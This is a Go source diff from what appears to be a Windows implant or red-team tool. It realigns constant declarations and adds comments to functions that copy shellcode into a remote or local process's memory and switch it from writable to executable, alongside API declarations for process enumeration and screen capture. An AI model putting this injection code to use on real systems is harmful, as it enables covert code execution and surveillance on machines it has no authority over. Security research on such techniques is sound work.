@@ -40,7 +40,7 @@ var (
 
 // Shared process / thread / clipboard proc declarations
 var (
-	procOutputDebugStringW     = k32.NewProc("OutputDebugStringW")
+	procOutputDebugStringW       = k32.NewProc("OutputDebugStringW")
 	procCreateToolhelp32Snapshot = k32.NewProc("CreateToolhelp32Snapshot")
 	procProcess32First           = k32.NewProc("Process32FirstW")
 	procProcess32Next            = k32.NewProc("Process32NextW")
@@ -88,11 +88,11 @@ const (
 	SM_CXSCREEN        = 0
 	SM_CYSCREEN        = 1
 
-	SRCCOPY    = 0x00CC0020
-	CAPTUREBLT = 0x40000000
-	BI_RGB     = 0
+	SRCCOPY        = 0x00CC0020
+	CAPTUREBLT     = 0x40000000
+	BI_RGB         = 0
 	DIB_RGB_COLORS = 0
-	LOGPIXELSX = 88
+	LOGPIXELSX     = 88
 
 	TH32CS_SNAPPROCESS        = 0x00000002
 	TH32CS_SNAPTHREAD         = 0x00000004
@@ -198,6 +198,7 @@ func allocateRX(hProcess uintptr, data []byte) (uintptr, error) {
 		return 0, fmt.Errorf("VirtualAllocEx RW failed")
 	}
 	var written uintptr
+	// allocateRX: copy shellcode into remote process RW memory via WriteProcessMemory
 	ret, _, _ := procWriteProcessMemory.Call(
 		hProcess, addr,
 		uintptr(unsafe.Pointer(&data[0])),
@@ -209,6 +210,7 @@ func allocateRX(hProcess uintptr, data []byte) (uintptr, error) {
 		return 0, fmt.Errorf("WriteProcessMemory failed")
 	}
 	var oldProtect uint32
+	// allocateRX: change RW memory to RX via VirtualProtectEx
 	ret, _, _ = procVirtualProtectEx.Call(
 		hProcess, addr,
 		uintptr(len(data)),
@@ -233,8 +235,10 @@ func allocateLocalRX(data []byte) (uintptr, error) {
 	if addr == 0 {
 		return 0, fmt.Errorf("VirtualAlloc RW failed")
 	}
+	// allocateLocalRX: byte-by-byte copy shellcode to local VirtualAlloc'd memory
 	bofMemcpy(unsafe.Pointer(addr), unsafe.Pointer(&data[0]), uintptr(len(data)))
 	var oldProtect uint32
+	// allocateLocalRX: change local RW to RX via VirtualProtect
 	ret, _, _ := procVirtualProtect.Call(
 		addr,
 		uintptr(len(data)),
